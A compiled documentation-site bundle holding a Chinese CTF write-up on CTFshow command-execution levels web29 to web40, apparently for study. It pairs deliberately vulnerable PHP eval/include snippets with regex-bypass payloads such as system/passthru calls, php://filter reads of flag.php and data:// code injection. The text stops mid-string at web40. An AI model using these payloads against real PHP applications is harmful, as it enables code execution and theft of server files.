"use strict";(self.webpackChunkmu_website=self.webpackChunkmu_website||[]).push([[4823],{11484:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>s,metadata:()=>c,toc:()=>h});var l=r(74848),a=r(28453);const s={},i="\u547d\u4ee4\u6267\u884c",c={id:"Web/CTFshow\u5165\u95e8/\u547d\u4ee4\u6267\u884c",title:"\u547d\u4ee4\u6267\u884c",description:"web29",source:"@site/docs/Web/CTFshow\u5165\u95e8/02-\u547d\u4ee4\u6267\u884c.md",sourceDirName:"Web/CTFshow\u5165\u95e8",slug:"/Web/CTFshow\u5165\u95e8/\u547d\u4ee4\u6267\u884c",permalink:"/docs/Web/CTFshow\u5165\u95e8/\u547d\u4ee4\u6267\u884c",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Web/CTFshow\u5165\u95e8/02-\u547d\u4ee4\u6267\u884c.md",tags:[],version:"current",sidebarPosition:2,frontMatter:{},sidebar:"Web",previous:{title:"\u4fe1\u606f\u641c\u96c6",permalink:"/docs/Web/CTFshow\u5165\u95e8/\u4fe1\u606f\u641c\u96c6"},next:{title:"\u6587\u4ef6\u5305\u542b",permalink:"/docs/Web/CTFshow\u5165\u95e8/\u6587\u4ef6\u5305\u542b"}},d={},h=[{value:"web29",id:"web29",level:3},{value:"web30",id:"web30",level:3},{value:"web31",id:"web31",level:3},{value:"web32",id:"web32",level:3},{value:"web33",id:"web33",level:3},{value:"web34",id:"web34",level:3},{value:"web35",id:"web35",level:3},{value:"web36",id:"web36",level:3},{value:"web37",id:"web37",level:3},{value:"web38",id:"web38",level:3},{value:"web39",id:"web39",level:3},{value:"web40",id:"web40",level:3},{value:"web41",id:"web41",level:3},{value:"web42",id:"web42",level:3},{value:"web43",id:"web43",level:3},{value:"web44",id:"web44",level:3},{value:"web45",id:"web45",level:3},{value:"web46",id:"web46",level:3},{value:"web47",id:"web47",level:3},{value:"web48",id:"web48",level:3},{value:"web49",id:"web49",level:3},{value:"web50",id:"web50",level:3},{value:"web51",id:"web51",level:3},{value:"web52",id:"web52",level:3},{value:"web53",id:"web53",level:3},{value:"web54",id:"web54",level:3},{value:"web55",id:"web55",level:3},{value:"***web56",id:"web56",level:3},{value:"web57",id:"web57",level:3},{value:"web58",id:"web58",level:3},{value:"web59",id:"web59",level:3},{value:"web60",id:"web60",level:3},{value:"web61",id:"web61",level:3},{value:"web62",id:"web62",level:3},{value:"web63",id:"web63",level:3},{value:"web64",id:"web64",level:3},{value:"web65",id:"web65",level:3},{value:"web66",id:"web66",level:3},{value:"web67",id:"web67",level:3},{value:"web68",id:"web68",level:3},{value:"web69",id:"web69",level:3},{value:"web70",id:"web70",level:3},{value:"web71",id:"web71",level:3},{value:"***web72",id:"web72",level:3},{value:"web73",id:"web73",level:3},{value:"web74",id:"web74",level:3},{value:"***web75",id:"web75",level:3},{value:"web76",id:"web76",level:3},{value:"***web77",id:"web77",level:3},{value:"web118",id:"web118",level:3},{value:"web119",id:"web119",level:3},{value:"web120",id:"web120",level:3},{value:"web121",id:"web121",level:3},{value:"web122",id:"web122",level:3},{value:"web124",id:"web124",level:3},{value:"\u77e5\u8bc6\u70b9\u603b\u7ed3",id:"\u77e5\u8bc6\u70b9\u603b\u7ed3",level:2}];function t(e){const n={a:"a",blockquote:"blockquote",code:"code",del:"del",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.h1,{id:"\u547d\u4ee4\u6267\u884c",children:"\u547d\u4ee4\u6267\u884c"}),"\n",(0,l.jsx)(n.h3,{id:"web29",children:"web29"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'preg_match \uff1a\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\r\n\u6a21\u5f0f\u5206\u9694\u7b26\u540e\u7684"i"\u6807\u8bb0\u8fd9\u662f\u4e00\u4e2a\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\u641c\u7d22\r\n\u6a21\u5f0f\u4e2d\u7684\\b\u6807\u8bb0\u4e00\u4e2a\u5355\u8bcd\u8fb9\u754c\uff0c\u6240\u4ee5\u53ea\u6709\u72ec\u7acb\u7684\u5355\u8bcd\u4f1a\u88ab\u5339\u914d\uff0c\u5982\uff1a\r\n    if (preg_match("/\\bweb\\b/i", "PHP is the web scripting language of choice.")) \uff1a   True\r\n    \r\n    if (preg_match("/\\bweb\\b/i", "PHP is the website scripting language of choice.")) \uff1a   False\r\n        \r\n\u5c0f\u6280\u5de7\uff1a\u5982\u679c\u4ec5\u4ec5\u60f3\u8981\u68c0\u67e5\u67d0\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u5305\u542b\u53e6\u5916\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e0d\u8981\u4f7f\u7528 preg_match() \uff0c \u4f7f\u7528 strpos() \u4f1a\u66f4\u5feb\u3002 \n'})}),"\n",(0,l.jsx)(n.p,{children:"\u9898\u76ee\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag/i\", $c)){\r\n        eval($c);\r\n    }\r\n    \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5373 $c \u4e0d\u80fd\u5339\u914d\u5230\u5927\u5c0f\u5199\u7684flag"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"payload: ?c=system('tac f*');\r\nlinux\u77e5\u8bc6\uff1a\u901a\u914d\u7b26\r\n*\t\u5339\u914d\u4efb\u4f55\u5b57\u7b26\u4e32\uff0f\u6587\u672c\uff0c\u5305\u62ec\u7a7a\u5b57\u7b26\u4e32\uff1b*\u4ee3\u8868\u4efb\u610f\u5b57\u7b26\uff080\u4e2a\u6216\u591a\u4e2a\uff09 ls file *\r\n?\t\u5339\u914d\u4efb\u4f55\u4e00\u4e2a\u5b57\u7b26\uff08\u4e0d\u5728\u62ec\u53f7\u5185\u65f6\uff09?\u4ee3\u8868\u4efb\u610f1\u4e2a\u5b57\u7b26 ls file 0\r\n[abcd]\t\u5339\u914dabcd\u4e2d\u4efb\u4f55\u4e00\u4e2a\u5b57\u7b26\r\n[a-z]\t\u8868\u793a\u8303\u56f4a\u5230z\uff0c\u8868\u793a\u8303\u56f4\u7684\u610f\u601d []\u5339\u914d\u4e2d\u62ec\u53f7\u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 ls file 0\r\n\r\n\u5bf9\u4e8elinux cat\u548cca''t ca\\t ca\"\"t\u6548\u679c\u662f\u76f8\u540c\u7684 \u8fd9\u6837\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7\u5b57\u7b26\u7684\u9650\u5236\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web30",children:"web30"}),"\n",(0,l.jsx)(n.p,{children:"\u9898\u76ee"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php/i\", $c)){\r\n        eval($c);\r\n    }\r\n    \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u6b21\u8fc7\u6ee4\u4e86system,\u4f46\u662f\u8fd8\u6709\u5176\u4ed6\u65b9\u6cd5\u80fd\u591f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4"}),"\n",(0,l.jsx)(n.p,{children:"\u5982\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"system : \u6267\u884c\u5916\u90e8\u7a0b\u5e8f\uff0c\u5e76\u4e14\u663e\u793a\u8f93\u51fa\uff0c\u5982\u679c PHP \u8fd0\u884c\u5728\u670d\u52a1\u5668\u6a21\u5757\u4e2d\uff0c system() \u51fd\u6570\u8fd8\u4f1a\u5c1d\u8bd5\u5728\u6bcf\u884c\u8f93\u51fa\u5b8c\u6bd5\u4e4b\u540e\uff0c \u81ea\u52a8\u5237\u65b0 web \u670d\u52a1\u5668\u7684\u8f93\u51fa\u7f13\u5b58\u3002\u5982\u679c\u8981\u83b7\u53d6\u4e00\u4e2a\u547d\u4ee4\u672a\u7ecf\u4efb\u4f55\u5904\u7406\u7684 \u539f\u59cb\u8f93\u51fa\uff0c \u8bf7\u4f7f\u7528 passthru() \u51fd\u6570\u3002\r\nexec \uff1a \u6267\u884c\u4e00\u4e2a\u5916\u90e8\u7a0b\u5e8f,\u56de\u663e\u6700\u540e\u4e00\u884c,\u9700\u8981\u7528echo\u8f93\u51fa\u3002\r\nshell_exec \uff1a \u901a\u8fc7 shell \u73af\u5883\u6267\u884c\u547d\u4ee4\uff0c\u5e76\u4e14\u5c06\u5b8c\u6574\u7684\u8f93\u51fa\u4ee5\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f\u8fd4\u56de\u3002\r\npopen \uff1a \u6253\u5f00\u4e00\u4e2a\u6307\u5411\u8fdb\u7a0b\u7684\u7ba1\u9053\uff0c\u8be5\u8fdb\u7a0b\u7531\u6d3e\u751f\u7ed9\u5b9a\u7684 command \u547d\u4ee4\u6267\u884c\u800c\u4ea7\u751f\u3002\r\nproc_open \uff1a \u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5e76\u4e14\u6253\u5f00\u7528\u6765\u8f93\u5165/\u8f93\u51fa\u7684\u6587\u4ef6\u6307\u9488\u3002\r\npassthru \uff1a \u6267\u884c\u5916\u90e8\u7a0b\u5e8f\u5e76\u4e14\u663e\u793a\u539f\u59cb\u8f93\u51fa\u3002\u540c exec() \u51fd\u6570\u7c7b\u4f3c\uff0c passthru() \u51fd\u6570 \u4e5f\u662f\u7528\u6765\u6267\u884c\u5916\u90e8\u547d\u4ee4\uff08command\uff09\u7684\u3002 \u5f53\u6240\u6267\u884c\u7684 Unix \u547d\u4ee4\u8f93\u51fa\u4e8c\u8fdb\u5236\u6570\u636e\uff0c \u5e76\u4e14\u9700\u8981\u76f4\u63a5\u4f20\u9001\u5230\u6d4f\u89c8\u5668\u7684\u65f6\u5019\uff0c \u9700\u8981\u7528\u6b64\u51fd\u6570\u6765\u66ff\u4ee3 exec() \u6216 system() \u51fd\u6570\u3002 \u5e38\u7528\u6765\u6267\u884c\u8bf8\u5982 pbmplus \u4e4b\u7c7b\u7684\u53ef\u4ee5\u76f4\u63a5\u8f93\u51fa\u56fe\u50cf\u6d41\u7684\u547d\u4ee4\u3002 \u901a\u8fc7\u8bbe\u7f6e Content-type \u4e3a image/gif\uff0c \u7136\u540e\u8c03\u7528 pbmplus \u7a0b\u5e8f\u8f93\u51fa gif \u6587\u4ef6\uff0c \u5c31\u53ef\u4ee5\u4ece PHP \u811a\u672c\u4e2d\u76f4\u63a5\u8f93\u51fa\u56fe\u50cf\u5230\u6d4f\u89c8\u5668\u3002\r\npcntl_exec() \uff1a \u5728\u5f53\u524d\u8fdb\u7a0b\u7a7a\u95f4\u6267\u884c\u6307\u5b9a\u7a0b\u5e8f\uff0c\u5f53\u53d1\u751f\u9519\u8bef\u65f6\u8fd4\u56de false \uff0c\u6ca1\u6709\u9519\u8bef\u65f6\u6ca1\u6709\u8fd4\u56de\u3002 \r\n`\uff08\u53cd\u5f15\u53f7\uff09\uff1a\u540c shell_exec() \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6240\u4ee5\u6784\u9020payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"payload: ?c=passthru('tac f*');\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web31",children:"web31"}),"\n",(0,l.jsx)(n.p,{children:"\u9898\u76ee"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){\r\n        eval($c);\r\n    }\r\n    \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u4e00\u6b21\u5bf9\u4e8e\u4e4b\u524d\u7684payload\u662f\u8fc7\u6ee4\u4e86\u7a7a\u683c\uff0c\u4f46\u662f\u6709\u591a\u79cd\u529e\u6cd5\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u8bb2\u89e3\u5982\u4e0b\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"${IFS} \u4f46\u4e0d\u80fd\u5199\u4f5c $IFS\r\n$IFS$9\r\n%09\r\n<>\r\n<\r\n$IFS%09\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u56e0\u6b64\u5f97\u5230payload\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'?c=passthru("tac%09f*");\r\n\u8fd9\u91cc\u8fd9\u4e94\u4e2a\uff0c\u53ea\u6709%09\u53ef\u4ee5\u7528\u3002\u56e0\u4e3a\u8fd9\u91cc\u662f\u547d\u4ee4\u6267\u884c\u4e0d\u662f\u4ee3\u7801\u6267\u884c\u3002\u5982${IFS}\u662f\u5728shell\u91cc\u7528\uff0c\u800c\u8fd9\u91cc\u662f\u5728\u7ed5\u8fc7php\u7684\u6b63\u5219\u3002\r\n\r\n\u53e6\u5916\u540ccat\u529f\u80fd\u7684\u51fd\u6570\u8fd8\u6709\uff1a\r\ncat\u3001tac\u3001more\u3001less\u3001head\u3001tail\u3001nl\u3001sed\u3001sort\u3001uniq\u3001rev\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web32",children:"web32"}),"\n",(0,l.jsx)(n.p,{children:"\u9898\u76ee"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){\r\n        eval($c);\r\n    }\r\n    \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e0a\u4e00\u5173\u7684\u8fd8\u80fd\u7528"}),"\n",(0,l.jsx)(n.p,{children:"\u56e0\u4e3a\u8fc7\u6ee4\u4e86\u5206\u53f7\uff0c\u6240\u4ee5\u4e4b\u524d\u7684\u90fd\u5931\u6548\u4e86\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528php\u77ed\u6807\u7b7e\u6765\u95ed\u5408\u6267\u884c\u547d\u4ee4\u3002\u8fd9\u91cc\u53ef\u4ee5\u7528?c=include$_GET[a]?>"}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u56e0\u4e3ainclude\u4e0d\u80fd\u76f4\u63a5\u5305\u542b\u51faflag\uff0c\u6240\u4ee5\u4f7f\u7528php\u4f2a\u534f\u8bae\u6765\u8bfb\u53d6flag\u7684base64\u5185\u5bb9"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web33",children:"web33"}),"\n",(0,l.jsx)(n.p,{children:"\u9898\u76ee"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\r\n        eval($c);\r\n    }\r\n    \r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7ee7\u7eed"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web34",children:"web34"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\r\n        eval($c);\r\n    }\r\n        \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6ca1\u5f71\u54cd\uff0c\u7ee7\u7eed"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web35",children:"web35"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\<|\\=/i\", $c)){\r\n        eval($c);\r\n    }\r\n    \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd8\u662f\u5bf9\u539fpayload\u6ca1\u6709\u5f71\u54cd\uff0c\u7ee7\u7eed"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web36",children:"web36"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\<|\\=|\\/|[0-9]/i\", $c)){\r\n        eval($c);\r\n    }\r\n    \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd8\u662f\u6ca1\u5f71\u54cd\uff0c\u53ea\u662f\u8fc7\u6ee4\u6570\u5b57"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web37",children:"web37"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"//flag in flag.php\r\nerror_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag/i\", $c)){\r\n        include($c);\r\n        echo $flag;\r\n    \r\n    }\r\n        \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u60f3\u6bd4\u4e8e\u4e4b\u524d\uff0c\u8fd9\u4e00\u6b21\u7ed9\u7684\u5c31\u4e0d\u662feval\u76f4\u63a5\u6765\u6267\u884c\u547d\u4ee4\uff0c\u800c\u662f\u4f7f\u7528\u7684include\u6765\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u56e0\u4e3a\u4e0d\u80fd\u5e26\u6709flag\uff0c\u6240\u4ee5php\u4f2a\u534f\u8bae\u6765\u8bfb\u662f\u4e0d\u884c\u7684\uff08\u56e0\u4e3a\u5fc5\u987b\u6253\u5b8c\u6574\u7684flag.php\uff09"}),"\n",(0,l.jsx)(n.p,{children:"\u4f2a\u534f\u8bae\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"\u603b\uff1a\r\nfile:// \u534f\u8bae\r\nphp:// \u534f\u8bae\r\nzip:// bzip2:// zlib:// \u534f\u8bae\r\ndata:// \u534f\u8bae\r\nhttp:// \u534f\u8bae https://\u534f\u8bae\r\nphar:// \u534f\u8bae\r\n\r\n\u5206\uff1a\r\nfile:// \u534f\u8bae\uff1a\r\n\t\t\u6761\u4ef6 allow_url_fopen:off/on  allow_url_include :off/on\r\n\t\t\u4f5c\u7528\uff1a\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u3002\u5728include()/require()\u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u5bfc\u5165\u975ephp\u6587\u4ef6\u4e5f\u4f1a\u88ab\u89e3\u6790\u4e3aphp\r\n\t\t\u7528\u6cd5\uff1a1.file://[\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\t \t\t2.[\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\t \t\t3.[http\uff1a//\u7f51\u7edc\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\r\nphp:// \u534f\u8bae\uff1a\u6761\u4ef6 allow_url_include :\u4ec5php://input php://stdin php://memory php://temp \u9700\u8981on allow_url_fopen:off/on\r\n\t\t\u4f5c\u7528\uff1aphp:// \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\uff0c\u5728CTF\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u662fphp://filter\u548cphp://input\uff0cphp://filter\u7528\u4e8e\u8bfb\u53d6\u6e90\u7801\uff0cphp://input\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801\r\n\t\tphp://filter\u53c2\u6570\u8be6\u89e3\uff1aresource=\uff08\u5fc5\u9009\uff0c\u6307\u5b9a\u4e86\u4f60\u8981\u7b5b\u9009\u8fc7\u6ee4\u7684\u6570\u636e\u6d41\uff09     read=\uff08\u53ef\u9009\uff09    write=\uff08\u53ef\u9009\uff09\r\n\t\t\u5bf9read\u548cwrite\uff0c\u53ef\u9009\u8fc7\u6ee4\u5668\u6709string.rot13\u3001string.toupper\u3001string.tolower\u3001string.strip_tags\u3001convert.base64-encode & convert.base64-decode\r\n         \u7528\u6cd5\u4e3e\u4f8b\uff1aphp://filter/read=convert.base64-encode/resource=flag.php\r\n\r\nzip:// bzip2:// zlib:// \u534f\u8bae\uff1a\r\n        \u6761\u4ef6\uff1aallow_url_fopen:off/on      allow_url_include :off/on\r\n        \u4f5c\u7528\uff1azip:// & bzip2:// & zlib:// \u5747\u5c5e\u4e8e\u538b\u7f29\u6d41\uff0c\u53ef\u4ee5\u8bbf\u95ee\u538b\u7f29\u6587\u4ef6\u4e2d\u7684\u5b50\u6587\u4ef6\uff0c\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u9700\u8981\u6307\u5b9a\u540e\u7f00\u540d\r\n        \u7528\u6cd5\uff1azip://[\u538b\u7f29\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84]%23[\u538b\u7f29\u6587\u4ef6\u5185\u7684\u5b50\u6587\u4ef6\u540d]\r\n        \t compress.bzip2://file.bz2\r\n        \t compress.zlib://file.gz\r\n        \u5176\u4e2dphar://\u548czip://\u7c7b\u4f3c\r\n\r\ndata:// \u534f\u8bae\uff1a\r\n        \u6761\u4ef6\uff1aallow_url_fopen:on    allow_url_include :on\r\n        \u4f5c\u7528\uff1a\u53ef\u4ee5\u4f7f\u7528data://\u6570\u636e\u6d41\u5c01\u88c5\u5668\uff0c\u4ee5\u4f20\u9012\u76f8\u5e94\u683c\u5f0f\u7684\u6570\u636e\u3002\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6267\u884cPHP\u4ee3\u7801\u3002\r\n        \u7528\u6cd5\uff1adata://text/plain,            data://text/plain;base64,\r\n        \u4e3e\u4f8b\uff1adata://text/plain,<?php%20phpinfo();?>\r\n        \t data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\r\n          \r\n        \u7531\u6b64\u53ef\u89c1\uff0cweb37\u8fd9\u9053\u9898\u53ef\u4ee5\u7528data://\u4f2a\u534f\u8bae\u6765\u6267\u884c\u4ee3\u7801\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7ec4\u5408\u5f97\u5230payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=data://text/plain,<?php%20system("tac%20f*");?>\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web38",children:"web38"}),"\n",(0,l.jsx)(n.p,{children:"\u9898\u76ee"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"//flag in flag.php\r\nerror_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|php|file/i\", $c)){\r\n        include($c);\r\n        echo $flag;\r\n    \r\n    }\r\n        \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u628aphp\u7ed9\u8fc7\u6ee4\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u6362\u4e2aphp\u7684\u77ed\u6807\u7b7e\uff0c\u53ef\u4ee5\u628aphp\u6362\u6210\u7b49\u53f7"}),"\n",(0,l.jsx)(n.p,{children:"\u6240\u4ee5payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'?c=data://text/plain,<?=%20system("tac%20f*");?>\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web39",children:"web39"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"//flag in flag.php\r\nerror_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag/i\", $c)){\r\n        include($c.\".php\");\r\n    }\r\n        \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:'\u8fd9\u91cc\u662f\u628a$c."php"\u62fc\u63a5\u4e86\u8d77\u6765\uff0c\u4f46\u662f\u8fd8\u662f\u53ef\u4ee5\u7528\u547d\u4ee4\u6267\u884c\uff0c\u56e0\u4e3a\u5728\u77ed\u6807\u7b7e\u91cc\u9762\u8fdb\u884c\u4e86\u4e00\u4e2a<?= ?> \u5df2\u7ecf\u95ed\u5408\u4e86\u6240\u4ee5\u4e0d\u4f1a\u53d7\u5230php\u7684\u5f71\u54cd'}),"\n",(0,l.jsx)(n.p,{children:"\u8fd8\u662f\u7528\u4e0a\u4e00\u9053\u9898\u7684payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'?c=data://text/plain,<?=%20system("tac%20f*");?>\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web40",children:"web40"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\\uff08|\\\uff09|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", $c)){\r\n        eval($c);\r\n    }\r\n        \r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fc7\u6ee4\u7684\u633a\u591a\u7684\uff0c\u4f46\u57fa\u672c\u90fd\u662f\u6570\u5b57\u548c\u7279\u6b8a\u7b26\u53f7\uff0c\u53ef\u4ee5\u6ce8\u610f\u7684\u662f\u4ed6\u8fc7\u6ee4\u7684\u662f\u4e2d\u6587\u7684\u62ec\u53f7\uff0c\u6ca1\u6709\u8fc7\u6ee4\u82f1\u6587\u7684()"}),"\n",(0,l.jsx)(n.p,{children:"\u5e38\u89c1\u7684\u7ed5\u8fc7\u59ff\u52bf"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"getallheaders()\uff1a\u8fd4\u56de\u6240\u6709\u7684HTTP\u5934\u4fe1\u606f\uff0c\u8fd4\u56de\u7684\u662f\u6570\u7ec4\u800ceval\u8981\u6c42\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u8981\u7528implode()\u51fd\u6570\u5c06\u6570\u7ec4\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\r\n\r\nget_defined_vars()\uff1a\u8be5\u51fd\u6570\u7684\u4f5c\u7528\u662f\u83b7\u53d6\u6240\u6709\u7684\u5df2\u5b9a\u4e49\u53d8\u91cf\uff0c\u8fd4\u56de\u503c\u4e5f\u662f\u6570\u7ec4\uff0c\u4e0d\u8fc7\u662f\u4e8c\u7ef4\u6570\u7ec4\uff0c\u7528var_dump()\u8f93\u51fa\u53ef\u4ee5\u770b\u89c1\u8f93\u51fa\u7684\u5185\u5bb9\uff0c\u770b\u89c1\u5728\u7b2c\u51e0\u4f4d\u4e4b\u540e\uff0c\u53ef\u4ee5\u7528current()\u51fd